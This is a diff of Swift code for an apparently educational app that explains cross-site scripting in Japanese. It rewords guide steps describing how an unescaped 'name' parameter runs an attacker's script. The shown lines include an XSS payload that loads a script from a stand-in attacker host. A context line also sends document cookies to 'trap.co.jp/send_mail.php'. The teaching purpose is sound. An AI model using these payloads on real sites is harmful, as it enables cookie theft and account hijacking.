@@ -56,9 +56,9 @@ iframe.setAttribute("src", "http://www.trap.co.jp/send_mail.php?cookie=" + docum
         appendGuideSection([
             GuideText(text: "この赤枠で囲まれたリンクをタップすると脆弱なWebサイトに遷移します。\nリンクの下に表示されたコードを見てみましょう。"),
             GuideText(
-                text: "脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」が設定されています。",
-                programingLanguages: [.html]
+                text: "脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには次の値が設定されています。"
             ),
+            GuideText(text: "<script src=http://www.trap.cp.jp/iframe_injection.js></script>", programingLanguages: [.html]),
             GuideText(text: "このnameの値をエスケープせずに直接表示することによって攻撃者のスクリプトが実行されます。"),
             ],
             onEnter: { completion in
@@ -101,7 +101,7 @@ iframe.setAttribute("src", "http://www.trap.co.jp/send_mail.php?cookie=" + docum
                 programingLanguages: [.html]
             ),
             GuideText(
-                text: "nameに設定された値をエスケープせずに表示した結果、\n「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」というコードが実行され攻撃者の用意したスクリプトが読み込まれてしまいました。",
+                text: "攻撃者から渡された値をエスケープせずに表示した結果、\n「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」というコードが実行され攻撃者の用意したスクリプトが読み込まれてしまいました。",
                 programingLanguages: [.php, .html]
                 )
             ],
